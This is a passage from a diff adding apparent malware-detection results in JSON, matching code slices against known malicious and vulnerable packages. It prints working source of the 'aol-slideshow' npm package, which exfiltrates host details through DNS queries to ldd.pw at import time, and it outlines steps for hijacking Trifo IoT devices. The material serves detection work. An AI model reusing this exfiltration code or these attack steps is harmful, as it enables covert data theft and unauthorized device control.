+                    "WebSocket traffic from IoT devices to unknown or non-standard servers",
+                    "HTTP requests to GitHub repositories for non-standard or encoded content retrieval",
+                    "Unusual POST requests from login pages to domains not associated with Microsoft or the organization"
+                  ],
+                  "how_to_detect": "Monitor for Office documents with embedded scripts exploiting known vulnerabilities (e.g., CVE-2022-41128), phishing pages that POST credentials to non-legitimate domains, unauthenticated access attempts to web application endpoints (such as Zoho ManageEngine ADSelfService Plus), IoT devices making outbound WebSocket connections to unknown servers, and malware querying public code repositories (e.g., GitHub) for encoded C2 instructions. Correlate these behaviors with known indicators of compromise, such as file hashes, domains, and process behaviors, and implement automated blocking or alerting on suspicious activity. Use network monitoring to detect anomalous outbound connections and file scanning to identify malicious document structures and embedded scripts."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_786839_snippet_1",
+              "source_package": "aol-slideshow (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_786839/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5049962997436523,
+              "code_similarity": 0.506393313407898,
+              "behavior_similarity": 0.5035993456840515,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const dns = require('dns');\nconst os = require('os');\nconst suffix = '.v1.ldd.pw';\nconst ns = 'ldd.pw';\nconst package = 'aol-slideshow';\n\nfunction sendToServer(data) {\n  data = Buffer.from(data).toString('hex');\n  data = data.match(/.{1,60}/g);\n  id = Math.random().toString(36).substring(2);\n  data.forEach(function (chunk, idx) {\n    try {\n      dns.resolve('v2_f.' + id + '.' + idx + '.' + chunk + '.v2_e' + suffix, 'A', console.log);\n    } catch (e) {}\n  });\n}\n\nfunction tryGet(toCall) {\n  try {\n    return toCall();\n  } catch(e) {\n    return 'err';\n  }\n}\n\ndata = {\n  p: package,\n  h: tryGet(os.hostname),\n  d: tryGet(os.homedir),\n  c: __dirname\n};\ndata = JSON.stringify(data);\nsendToServer(data);\ndns.lookup(ns, function(err, address) {\n  if (!err) {\n    nsAddress = address;\n  } else {\n    nsAddress = '8.8.8.8';\n  }\n  dns.setServers([nsAddress, '8.8.4.4']);\n  sendToServer(data);\n});",
+                "code_behavior": "At import-time, the code collects the package name, hostname, home directory, and current directory, encodes this information, and exfiltrates it via DNS queries to an attacker-controlled domain; if the attacker's DNS server is unreachable, it silently switches to public DNS servers to maintain stealth and avoid detection.",
+                "malice_analysis": {
+                  "why_suspicious": "The code gathers sensitive host and environment information and transmits it to an external, attacker-controlled domain using DNS queries, a covert exfiltration method. It also manipulates DNS resolver settings to ensure data exfiltration continues even if the attacker's DNS server is unavailable, all without user knowledge or consent.",
+                  "violated_expectations": "Legitimate npm packages should not collect or transmit host or environment data to external servers, especially not via DNS queries or without explicit user consent. Modifying DNS resolver settings for covert exfiltration is highly abnormal and malicious.",
+                  "similar_legitimate_use": "Some legitimate telemetry or crash reporting tools may collect environment data, but they do so transparently, with user consent, and transmit data over secure, documented channels (e.g., HTTPS), never via DNS queries or by modifying system DNS settings.",
+                  "key_indicators": [
+                    "Exfiltration of host and environment data via DNS queries",
+                    "Use of attacker-controlled domains (e.g., .v1.ldd.pw, ldd.pw)",
+                    "Silent modification of DNS resolver settings to public DNS servers",
+                    "Execution of exfiltration logic at import-time without user interaction",
+                    "No user notification or consent for data collection or transmission"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "aol-slideshow",
+                  "package_manager": "npm",
+                  "package_versions": "9.9.0",
+                  "why_malicious": "The package is malicious because it exploits dependency confusion by impersonating a legitimate internal dependency. Upon installation or import, it collects sensitive host information (such as hostname, home directory, and current directory) and exfiltrates this data to an attacker-controlled DNS domain using covert DNS queries. The code also manipulates DNS resolver settings to evade detection, demonstrating clear intent to compromise user privacy and security."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a result of dependency confusion, due to name squatting on the public npm registry.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of malicious code on the victim's system"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upon import or installation, the code collects host information including the package name, hostname, home directory, and current directory.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation of sensitive data for exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The collected data is encoded and exfiltrated via DNS queries to an attacker-controlled domain (v1.ldd.pw).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives notification of successful compromise and host details"
+                  },
+                  {
+                    "step": 4,
+                    "action": "If the attacker's DNS server is unreachable, the code silently switches to Google's public DNS servers to continue exfiltration and avoid raising suspicion.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Stealthy operation and anti-forensics, reducing likelihood of detection"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package that exfiltrates environment or host data at import-time",
+                    "Execution of DNS queries containing encoded host information to suspicious or attacker-controlled domains",
+                    "Silent modification of system DNS resolver settings within package code"
+                  ],
+                  "file_indicators": [
+                    "index.js containing DNS exfiltration logic",
+                    "References to attacker-controlled domains such as .v1.ldd.pw and ldd.pw"
+                  ],
+                  "network_indicators": [
+                    "DNS queries to domains matching *.v1.ldd.pw",
+                    "Unusual DNS traffic immediately after npm install or require() of the package"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that, upon installation or import, initiate DNS queries to external domains containing encoded data. Flag packages that reference suspicious domains (e.g., .v1.ldd.pw, ldd.pw) or modify DNS resolver settings. Use static analysis to detect code patterns that collect environment or host data and transmit it via DNS or other covert channels. Correlate network logs for DNS queries with package installation or import events to identify suspicious activity."
+                }
+              }
+            }
+          ]
+        },
+        {
+          "slice_id": "index_slice_2",
+          "code_snippet": "const mqtt = require(\"mqtt\");\n\nconst serverMQTTClientPrefix = \"/homebridge-mi-aqara\";\n\nMiAqaraPlatform.prototype.initServerMQTTClient = function() {\n    var that = this;\n    \n    var mqttCfg = that.ConfigUtil.getMQTTConfig();\n    if(mqttCfg) {\n        var mqttHost = \"mqtt://\" + (mqttCfg && mqttCfg['server'] || \"127.0.0.1\");\n        var mqttUsername = mqttCfg && mqttCfg['username'] || \"mqtt\";\n        var mqttPassword = mqttCfg && mqttCfg['password'] || \"mqtt\";\n        var mqttOptions = {\n            clientId: 'mqttjs_' + Math.random().toString(16).substr(2, 8),\n            username: mqttUsername,\n            password: mqttPassword\n        };\n        try {\n            that.mqttClient = mqtt.connect(mqttHost, mqttOptions);\n            that.mqttClient.subscribe(serverMQTTClientPrefix + \"/write\");\n            that.mqttClient.on('message', (topic, message) => {\n                if(topic === serverMQTTClientPrefix + \"/write\") {\n                    try {\n                        var msgObj = JSON.parse(message);\n                        var msg = message.toString();\n\n                        var cmd = msgObj['cmd'];\n                        var sid = msgObj['sid'];\n                        if(cmd === \"write\" && sid) {\n                            that.sendWriteCommandWithoutFeedback(sid, msg, {});\n                            that.log.debug(\"(MQTT)(Revc Success)Topic: \" + topic + \", Message: \" + message);\n                        } else {\n                            that.log.error(\"(MQTT)(Revc Fail: cmd or sid is empty)Topic: \" + topic + \", Message: \" + message);\n                        }\n                    } catch (ex) {\n                        that.log.error(\"(MQTT)(Revc Fail: \" + ex + \")Topic: \" + topic + \", Message: \" + message);\n                    }\n                }\n            });\n            that.log.info('MQTT client connect success.');\n        } catch(e) {\n            that.mqttClient = null;\n            that.log.error('MQTT client connect fail: ' + e);\n        }\n    }\n}\n\nMiAqaraPlatform.prototype.sendWriteCommandWithoutFeedback = function(deviceSid, command, options) {\n    var that = this;\n    var device = that.DeviceUtil.getBySid(deviceSid);\n    var gateway = that.GatewayUtil.getBySid(device.gatewaySid);\n    \n    var cipher = crypto.createCipheriv('aes-128-cbc', that.ConfigUtil.getGatewayPasswordByGatewaySid(gateway['sid']), iv);\n    var gatewayToken = gateway['token'];\n    var key = cipher.update(gatewayToken, \"ascii\", \"hex\");\n    cipher.final('hex');\n    \n    command = command.replace('${key}', key);\n    that.log.debug(\"[Send]\" + command);\n    serverAqaraLANProtocolSocket.send(command, 0, command.length, gateway.port, gateway.ip, err => err && reject(err));\n}\n\nMiAqaraPlatform.prototype.sendMQTTMessage4ParseMessage = function(msg, rinfo) {\n    var that = this;\n    \n    var jsonObj = that.getJsonObj(msg);\n    var cmd = jsonObj['cmd'];\n    var sid = jsonObj['sid'];\n    \n    if (cmd === 'heartbeat') {\n        return;\n    }\n    \n    that.mqttClient.publish(serverMQTTClientPrefix, msg);\n    that.log.debug(\"(MQTT)(Send Success)Topic: \" + serverMQTTClientPrefix + \", Message: \" + msg);\n    \n    that.mqttClient.publish(serverMQTTClientPrefix + \"/\" + cmd, msg);\n    that.log.debug(\"(MQTT)(Send Success)Topic: \" + serverMQTTClientPrefix + \"/\" + cmd + \", Message: \" + msg);\n    \n    if(sid) {\n        that.mqttClient.publish(serverMQTTClientPrefix + \"/\" + sid, msg);\n        that.log.debug(\"(MQTT)(Send Success)Topic: \" + serverMQTTClientPrefix + \"/\" + sid + \", Message: \" + msg);\n        \n        that.mqttClient.publish(serverMQTTClientPrefix + \"/\" + sid + \"/\" + cmd, msg);\n        that.log.debug(\"(MQTT)(Send Success)Topic: \" + serverMQTTClientPrefix + \"/\" + sid + \"/\" + cmd + \", Message: \" + msg);\n    }\n}",
+          "is_malicious": false,
+          "malice_score": 0.5289781093597412,
+          "confidence": 0.3,
+          "behavior_summary": "When initialized with MQTT configuration, the code connects to a configurable MQTT broker (defaulting to mqtt://127.0.0.1) using credentials from configuration, subscribes to the topic '/homebridge-mi-aqara/write', and listens for incoming messages. Upon receiving a 'write' command with a device SID, it encrypts the gateway token using AES-128-CBC with a hardcoded IV and gateway password, replaces a placeholder in the command with the encrypted key, and sends the command via UDP to the device's IP and port. It also publishes parsed device messages to multiple MQTT topics for further processing. This enables remote command execution on devices via MQTT messages, facilitating control and potential unauthorized device manipulation.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code connects to an MQTT broker (defaulting to localhost) using credentials from configuration, subscribes to a specific topic, and processes incoming messages to send commands to IoT devices. It uses AES-128-CBC encryption with a gateway password and a hardcoded IV to encrypt a gateway token before sending commands via UDP. While this enables remote control of devices, the code does not exhibit clear malicious intent such as unauthorized data exfiltration, credential theft, or command injection beyond its intended device management purpose. Compared to the known malicious patterns, this code does not connect to suspicious external MQTT brokers, does not use weak or public key derivation methods, and uses authentication credentials rather than none or predictable client IDs. The encryption is applied to a token before sending commands, which is a legitimate security measure rather than a vulnerability. The behavior aligns with typical IoT device management platforms rather than malware. However, the ability to remotely execute commands on devices via MQTT could be abused if the MQTT broker or credentials are compromised, so some caution is warranted. Overall, the code is not definitively malicious but has some risk factors inherent to remote device control.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240824_195357_680271_snippet_3",
+              "source_package": "Trifo Ironpie M6 / Trifo Home Android App (IoT firmware / Android APK)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195357_680271/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5690689086914062,
+              "code_similarity": 0.5533708333969116,
+              "behavior_similarity": 0.5847670435905457,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "mqtt.connect('tcp://mqtt.trifo.com:1883'); // initial packets unencrypted, then payload encrypted with dev_key",
+                "code_behavior": "At device runtime, the firmware connects to the MQTT broker at tcp://mqtt.trifo.com:1883, exchanges initial packets in plaintext, and then encrypts payloads using a device key (dev_key) that is derived from public information such as the MAC address, allowing attackers to decrypt traffic and impersonate the server.",
+                "malice_analysis": {
+                  "why_suspicious": "Partial encryption with a weakly derived key (from public device information) fails to protect sensitive data and allows attackers to decrypt MQTT payloads or perform man-in-the-middle attacks.",
+                  "violated_expectations": "All device-server communication should be encrypted end-to-end using strong, randomly generated keys that are not derivable from public information.",
+                  "similar_legitimate_use": "There is no legitimate use for partial encryption with weak key derivation in production IoT devices.",
+                  "key_indicators": [
+                    "Unencrypted initial MQTT handshake",
+                    "Encryption key derived from MAC address or other public info",
+                    "Susceptibility to MITM and replay attacks",
+                    "MQTT broker: mqtt.trifo.com:1883"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "device runtime",
+                  "file_location": "Ironpie vacuum firmware (MQTT encryption logic)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Trifo Ironpie M6 / Trifo Home Android App",
+                  "package_manager": "IoT firmware / Android APK",
+                  "package_versions": "All versions as of Dec 2019",
+                  "why_malicious": "The Trifo Ironpie M6 ecosystem, including the Trifo Home Android App, exposes users to critical security and privacy risks due to insecure update mechanisms, lack of authentication, weak encryption, and remote access vulnerabilities. These flaws allow attackers to hijack devices, intercept and replace firmware or app updates, access live video feeds, and exfiltrate sensitive user data."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker intercepts the app's update request to http://update.trifo.com/check_update?app=trifo_home and supplies a malicious APK over HTTP.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Compromise of the user's mobile device through installation of a malicious APK."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker connects to the MQTT server at mqtt.trifo.com:1883 using a predictable client ID (the device's MAC address), impersonates the device, or subscribes to its topics.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Access to device events, sensitive information, and the ability to manipulate device communications."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker derives the dev_key from public information (such as the MAC address), decrypts MQTT payloads, and impersonates the server to the device.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Full control over the vacuum device and access to sensitive data exchanged over MQTT."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker uses information exposed via MQTT to derive the RTMP video feed key and connects to rtmp://video.trifo.com/live/{derived_key} to access the live video stream.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Unauthorized surveillance and privacy breach through remote access to the device's live video feed."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "IoT device firmware or Android apps making update requests over unencrypted HTTP channels",
+                    "MQTT connections to mqtt.trifo.com:1883 without authentication and with client IDs matching MAC address patterns",
+                    "Unencrypted MQTT traffic followed by payloads encrypted with keys derived from device MAC addresses",
+                    "RTMP video feed access attempts to video.trifo.com/live/ using keys that can be derived from public device information"
+                  ],
+                  "file_indicators": [
+                    "APK updates downloaded from http://update.trifo.com/check_update",
+                    "APK files installed from non-Google Play sources",
+                    "MQTT client IDs matching device MAC address formats (e.g., 12:34:56:78:9A:BC)"
+                  ],
+                  "network_indicators": [
+                    "HTTP requests to update.trifo.com/check_update",
+                    "MQTT traffic to mqtt.trifo.com:1883 without TLS encryption",
+                    "MQTT client connections with client IDs matching MAC address patterns",
+                    "RTMP connections to video.trifo.com/live/"
+                  ],
+                  "how_to_detect": "Monitor for IoT devices or mobile apps making update requests over HTTP to update.trifo.com, MQTT connections to mqtt.trifo.com:1883 without authentication or using MAC address-based client IDs, and RTMP video feed access attempts to video.trifo.com/live/ from unauthorized sources. Flag APK downloads and installations from non-official sources, and inspect MQTT traffic for unencrypted or weakly encrypted payloads. Correlate network activity with device MAC addresses to identify predictable client ID usage."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102819_898724_snippet_3",
+              "source_package": "Trifo Ironpie M6 / Trifo Home Android App (IoT firmware / Android APK)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102819_898724/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5200977325439453,
+              "code_similarity": 0.45012372732162476,
+              "behavior_similarity": 0.5900717973709106,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "mqtt.connect('mqtt.trifo.com', ssl=False); encrypt_payload(dev_key)",
+                "code_behavior": "At device boot or during runtime, the code connects to the MQTT server at mqtt.trifo.com without SSL/TLS encryption, then encrypts only the message payload using a device key (dev_key), exposing all MQTT metadata and allowing attackers to intercept and decrypt traffic if the dev_key is known or reused.",
+                "malice_analysis": {
+                  "why_suspicious": "Unencrypted transport exposes sensitive metadata such as topics, client IDs, and message timing, and partial encryption (payload only) is insufficient if the dev_key is static or can be derived, enabling man-in-the-middle attacks.",
+                  "violated_expectations": "All sensitive IoT traffic should use end-to-end encryption (SSL/TLS) to protect both payload and metadata. Device keys should be unique and not reused across devices.",
+                  "similar_legitimate_use": "No legitimate use for plaintext MQTT or static encryption keys in production IoT deployments.",
+                  "key_indicators": [
+                    "MQTT connections established without SSL/TLS (ssl=False)",
+                    "Only payload encrypted, metadata sent in cleartext",
+                    "dev_key reused or hardcoded across devices"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "device boot / runtime",
+                  "file_location": "Ironpie vacuum firmware (MQTT encryption logic)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Trifo Ironpie M6 / Trifo Home Android App",
+                  "package_manager": "IoT firmware / Android APK",
+                  "package_versions": "All versions as of Dec 2019",
+                  "why_malicious": "The Trifo Ironpie M6 ecosystem, including its Android app and device firmware, exposes users to critical security vulnerabilities. These include an insecure update mechanism using unencrypted HTTP, lack of authentication in MQTT communication, weak or partial encryption of device traffic, and remote video feed access with easily derived keys. These flaws enable attackers to hijack devices, exfiltrate sensitive data, and compromise user privacy through unauthorized surveillance and remote code execution."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker intercepts the insecure HTTP update request from the Trifo Home Android App and serves a malicious APK in place of the legitimate update.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Remote code execution on the user's Android device, enabling installation of attacker-controlled software."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker connects to the MQTT server using a predictable client ID (the device's MAC address) and no authentication, impersonating the device or subscribing to its topics.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Access to device events, control commands, and sensitive information exchanged over MQTT."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker monitors unencrypted MQTT traffic, obtains the dev_key and device metadata, and uses this information to decrypt payloads and derive the RTMP stream key.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Ability to decrypt MQTT traffic and calculate the RTMP stream key for video feed access."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker uses the derived RTMP stream key to access the vacuum's live video feed remotely via the RTMP endpoint.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Unauthorized surveillance of the user's home and compromise of user privacy."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "IoT device firmware or Android app making unencrypted HTTP requests to update.trifo.com for APK updates",
+                    "MQTT connections to mqtt.trifo.com without authentication or over plaintext (port 1883)",
+                    "Use of predictable client IDs (e.g., device MAC addresses) in MQTT traffic",
+                    "RTMP video streams accessible from IoT device IPs using keys derivable from MQTT-exposed device metadata"
+                  ],
+                  "file_indicators": [
+                    "Android APKs downloaded from http://update.trifo.com/app/latest.apk or other non-Google Play sources",
+                    "MQTT client configuration files in firmware with 'auth=None' or missing authentication fields",
+                    "Firmware code or configuration files containing hardcoded dev_key values or MAC address usage for client IDs"
+                  ],
+                  "network_indicators": [
+                    "Unencrypted HTTP requests to update.trifo.com observed in network traffic",
+                    "MQTT traffic to mqtt.trifo.com on port 1883 without SSL/TLS",
+                    "RTMP traffic from or to IoT device IPs, especially on default RTMP ports (1935), with stream keys matching patterns derivable from device metadata"
+                  ],
+                  "how_to_detect": "Monitor network traffic for IoT devices making unencrypted HTTP requests to update.trifo.com for APK updates, MQTT connections to mqtt.trifo.com without authentication or SSL/TLS, and RTMP streams accessible with keys derived from device metadata. Flag APK sideloading from non-official sources, inspect firmware for hardcoded credentials or lack of authentication, and alert on RTMP endpoints accessible without strong authentication. Correlate device MAC addresses in MQTT traffic with RTMP stream key derivation patterns to identify potential unauthorized video feed access."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102819_898724_snippet_2",
+              "source_package": "Trifo Ironpie M6 / Trifo Home Android App (IoT firmware / Android APK)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102819_898724/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5095997452735901,
+              "code_similarity": 0.4431891441345215,
+              "behavior_similarity": 0.5760103464126587,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "mqtt.connect('mqtt.trifo.com', client_id=mac_address, auth=None)",
+                "code_behavior": "At device boot or during runtime, the code connects to the MQTT server at mqtt.trifo.com using a predictable client ID based on the device's MAC address and no authentication, allowing any party to impersonate the device or intercept its messages.",
+                "malice_analysis": {
+                  "why_suspicious": "Lack of authentication and use of predictable client IDs allow attackers to hijack device sessions, subscribe to sensitive topics, or inject malicious commands.",
+                  "violated_expectations": "Production IoT devices should use strong, unique authentication credentials for all server communications and avoid predictable identifiers.",
+                  "similar_legitimate_use": "Open MQTT connections may be used in test or development environments, but are not acceptable for production consumer devices.",
+                  "key_indicators": [
+                    "No authentication on MQTT connection",
+                    "Predictable client IDs (MAC address used as identifier)",
+                    "MQTT server endpoint hardcoded as mqtt.trifo.com"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "device boot / runtime",
+                  "file_location": "Ironpie vacuum firmware (MQTT client logic)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Trifo Ironpie M6 / Trifo Home Android App",
+                  "package_manager": "IoT firmware / Android APK",
+                  "package_versions": "All versions as of Dec 2019",
+                  "why_malicious": "The Trifo Ironpie M6 ecosystem, including its Android app and device firmware, exposes users to critical security vulnerabilities. These include an insecure update mechanism using unencrypted HTTP, lack of authentication in MQTT communication, weak or partial encryption of device traffic, and remote video feed access with easily derived keys. These flaws enable attackers to hijack devices, exfiltrate sensitive data, and compromise user privacy through unauthorized surveillance and remote code execution."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker intercepts the insecure HTTP update request from the Trifo Home Android App and serves a malicious APK in place of the legitimate update.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Remote code execution on the user's Android device, enabling installation of attacker-controlled software."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker connects to the MQTT server using a predictable client ID (the device's MAC address) and no authentication, impersonating the device or subscribing to its topics.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Access to device events, control commands, and sensitive information exchanged over MQTT."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker monitors unencrypted MQTT traffic, obtains the dev_key and device metadata, and uses this information to decrypt payloads and derive the RTMP stream key.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Ability to decrypt MQTT traffic and calculate the RTMP stream key for video feed access."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker uses the derived RTMP stream key to access the vacuum's live video feed remotely via the RTMP endpoint.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Unauthorized surveillance of the user's home and compromise of user privacy."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "IoT device firmware or Android app making unencrypted HTTP requests to update.trifo.com for APK updates",
+                    "MQTT connections to mqtt.trifo.com without authentication or over plaintext (port 1883)",
+                    "Use of predictable client IDs (e.g., device MAC addresses) in MQTT traffic",
+                    "RTMP video streams accessible from IoT device IPs using keys derivable from MQTT-exposed device metadata"
+                  ],
+                  "file_indicators": [
+                    "Android APKs downloaded from http://update.trifo.com/app/latest.apk or other non-Google Play sources",
+                    "MQTT client configuration files in firmware with 'auth=None' or missing authentication fields",
+                    "Firmware code or configuration files containing hardcoded dev_key values or MAC address usage for client IDs"
+                  ],
+                  "network_indicators": [
+                    "Unencrypted HTTP requests to update.trifo.com observed in network traffic",
+                    "MQTT traffic to mqtt.trifo.com on port 1883 without SSL/TLS",
+                    "RTMP traffic from or to IoT device IPs, especially on default RTMP ports (1935), with stream keys matching patterns derivable from device metadata"
+                  ],
+                  "how_to_detect": "Monitor network traffic for IoT devices making unencrypted HTTP requests to update.trifo.com for APK updates, MQTT connections to mqtt.trifo.com without authentication or SSL/TLS, and RTMP streams accessible with keys derived from device metadata. Flag APK sideloading from non-official sources, inspect firmware for hardcoded credentials or lack of authentication, and alert on RTMP endpoints accessible without strong authentication. Correlate device MAC addresses in MQTT traffic with RTMP stream key derivation patterns to identify potential unauthorized video feed access."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195357_680271_snippet_2",
+              "source_package": "Trifo Ironpie M6 / Trifo Home Android App (IoT firmware / Android APK)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195357_680271/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5077709555625916,
+              "code_similarity": 0.43734419345855713,
+              "behavior_similarity": 0.578197717666626,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "mqtt.connect('tcp://mqtt.trifo.com:1883', client_id=mac_address)",
+                "code_behavior": "At device runtime, the firmware initiates an MQTT connection to tcp://mqtt.trifo.com:1883 using the device's MAC address as the client ID, without requiring authentication, which allows attackers to impersonate devices or subscribe to their topics and intercept sensitive data.",
+                "malice_analysis": {
+                  "why_suspicious": "Using predictable client IDs (MAC addresses) and omitting authentication enables unauthorized parties to connect to the MQTT broker, impersonate devices, and access or manipulate device communications.",
+                  "violated_expectations": "IoT devices should use strong, unique authentication credentials and random or securely generated client IDs to prevent unauthorized access.",
+                  "similar_legitimate_use": "Test or development environments may use unauthenticated MQTT connections, but production devices should never do so.",
+                  "key_indicators": [
+                    "MQTT connections without authentication",
+                    "Client IDs derived from device MAC addresses",
+                    "Open subscription to device-specific topics",
+                    "MQTT broker: mqtt.trifo.com:1883"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "device runtime",
+                  "file_location": "Ironpie vacuum firmware (MQTT client logic)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Trifo Ironpie M6 / Trifo Home Android App",
+                  "package_manager": "IoT firmware / Android APK",
+                  "package_versions": "All versions as of Dec 2019",
+                  "why_malicious": "The Trifo Ironpie M6 ecosystem, including the Trifo Home Android App, exposes users to critical security and privacy risks due to insecure update mechanisms, lack of authentication, weak encryption, and remote access vulnerabilities. These flaws allow attackers to hijack devices, intercept and replace firmware or app updates, access live video feeds, and exfiltrate sensitive user data."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker intercepts the app's update request to http://update.trifo.com/check_update?app=trifo_home and supplies a malicious APK over HTTP.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Compromise of the user's mobile device through installation of a malicious APK."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker connects to the MQTT server at mqtt.trifo.com:1883 using a predictable client ID (the device's MAC address), impersonates the device, or subscribes to its topics.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Access to device events, sensitive information, and the ability to manipulate device communications."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker derives the dev_key from public information (such as the MAC address), decrypts MQTT payloads, and impersonates the server to the device.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Full control over the vacuum device and access to sensitive data exchanged over MQTT."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker uses information exposed via MQTT to derive the RTMP video feed key and connects to rtmp://video.trifo.com/live/{derived_key} to access the live video stream.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Unauthorized surveillance and privacy breach through remote access to the device's live video feed."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "IoT device firmware or Android apps making update requests over unencrypted HTTP channels",
+                    "MQTT connections to mqtt.trifo.com:1883 without authentication and with client IDs matching MAC address patterns",
+                    "Unencrypted MQTT traffic followed by payloads encrypted with keys derived from device MAC addresses",
+                    "RTMP video feed access attempts to video.trifo.com/live/ using keys that can be derived from public device information"
+                  ],
+                  "file_indicators": [
+                    "APK updates downloaded from http://update.trifo.com/check_update",
+                    "APK files installed from non-Google Play sources",
+                    "MQTT client IDs matching device MAC address formats (e.g., 12:34:56:78:9A:BC)"
+                  ],
+                  "network_indicators": [
+                    "HTTP requests to update.trifo.com/check_update",
+                    "MQTT traffic to mqtt.trifo.com:1883 without TLS encryption",
+                    "MQTT client connections with client IDs matching MAC address patterns",
+                    "RTMP connections to video.trifo.com/live/"
+                  ],
+                  "how_to_detect": "Monitor for IoT devices or mobile apps making update requests over HTTP to update.trifo.com, MQTT connections to mqtt.trifo.com:1883 without authentication or using MAC address-based client IDs, and RTMP video feed access attempts to video.trifo.com/live/ from unauthorized sources. Flag APK downloads and installations from non-official sources, and inspect MQTT traffic for unencrypted or weakly encrypted payloads. Correlate network activity with device MAC addresses to identify predictable client ID usage."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_056835_snippet_4",
+              "source_package": "@typescript_eslinter/eslint (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_056835/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4645950198173523,
+              "code_similarity": 0.473869651556015,
+              "behavior_similarity": 0.45532041788101196,
+              "matched_snippet": {
